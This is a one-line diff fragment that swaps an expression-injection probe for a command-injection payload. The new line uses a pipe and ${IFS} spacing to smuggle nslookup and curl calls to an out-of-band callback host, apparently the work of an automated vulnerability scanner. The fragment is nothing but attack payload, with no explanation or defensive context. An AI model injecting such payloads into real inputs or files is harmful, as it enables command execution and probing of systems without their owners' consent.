@@ -1,1 +1,1 @@
-${10000279+9999228}
+|(nslookup${IFS}-q${IFS}cname${IFS}hitprbfhcmhno82399.bxss.me||curl${IFS}hitprbfhcmhno82399.bxss.me)
